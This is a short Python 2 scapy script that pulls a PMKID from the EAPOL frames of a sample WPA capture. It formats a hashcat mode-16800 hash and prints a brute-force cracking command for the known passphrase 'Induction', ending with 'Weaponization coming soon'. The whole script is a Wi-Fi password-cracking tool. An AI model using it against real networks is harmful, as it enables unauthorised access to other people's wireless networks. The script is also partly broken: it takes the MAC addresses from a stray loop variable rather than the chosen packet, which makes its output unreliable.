#!/usr/bin/python2

from scapy.all import *
import packetEssentials as PE

pkts = rdpcap('wpa-Induction.pcap')
essid = 'Coherer'
psk = 'Induction'

eapols = []
for i in pkts:
    if i.haslayer(EAPOL):
        eapols.append(i)
  
ourPkt = None
for i in eapols:
    
    ## AES == 89, TKIP == 8a
    if PE.pt.byteRip(i[Raw], qty = 3)[6:] == '89' or\
       PE.pt.byteRip(i[Raw], qty = 3)[6:] == '8a':
        ourPkt = i

if ourPkt is not None:
    pmkid = PE.pt.byteRip(ourPkt[Raw].load,
                          order = 'last',
                          qty = 16,
                          compress = True)
    if pmkid[-1] != 0:
        
        ## Set PMKID
        ourHash = pmkid + '*'
        
        ## BSSID
        ourHash += i[Dot11].addr1.replace(':', '') + '*'
        
        ## Tgt MAC
        ourHash += i[Dot11].addr2.replace(':', '') + '*'
        
        ## ESSID
        ourHash += 'Coherer'.encode('hex')

with open('ourHash', 'w') as oFile:
    oFile.write(ourHash + '\n')

print ("\n\nAnalysis complete, Password for this example is Induction")
print ("./hashcat64.bin -m 16800 ourHash -a 3 -w 3 Induction")
print ("\nStay tuned...  Weaponization coming soon")
        
